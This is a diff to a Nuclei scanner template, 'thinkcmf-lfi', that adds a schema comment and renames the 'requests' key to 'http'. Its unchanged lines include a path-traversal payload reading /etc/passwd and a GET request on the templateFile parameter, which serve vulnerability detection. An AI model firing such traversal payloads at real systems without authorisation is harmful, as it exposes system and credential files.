@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: thinkcmf-lfi
 
 info:
@@ -11,7 +12,7 @@ info:
     unix-payload: ../../../../../../../../../../../../../../../../etc/passwd
   tags: thinkcmf,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/?a=display&templateFile=README.md"
